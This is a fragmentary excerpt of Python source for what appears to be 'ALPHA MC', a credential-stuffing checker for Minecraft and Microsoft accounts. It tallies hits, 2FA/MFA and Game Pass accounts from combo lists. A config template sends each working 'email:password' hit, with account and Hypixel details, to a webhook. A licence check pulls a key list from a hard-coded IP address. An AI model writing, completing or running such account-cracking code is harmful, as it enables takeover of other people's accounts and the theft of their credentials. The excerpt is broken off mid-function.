...
def cuiscreen():
    ...
    utils.set_title(f"ALPHA MC by ALPHA STUDIO| Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
...
def loadconfig():
    ...
    if not os.path.isfile("config.ini"):
        ...
        c['Settings'] = {
            ...
            'WebhookMessage': '''HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
...
def check_key():
    try:
        ...
        key_list = requests.get("http://65.109.80.126:20208/key.txt").text.splitlines()
        if user_key in key_list:
            print(Fore.GREEN + "✅ Key valid. Access granted.")
        else:
            print(Fore.RED + "❌ Invalid key. Access denied.")
            input("Press Enter to exit...")
            exit()
    except Exception as e:
        print(Fore.RED + f"❌ Error verifying key: {e}")
        input("Press Enter to exit...")
        exit()
...
def Main():
    ...
    utils.set_title("ALPHA MC BY ALPHA STUDIO ")
    os.system('cls')
    try:
        loadconfig()
    except:
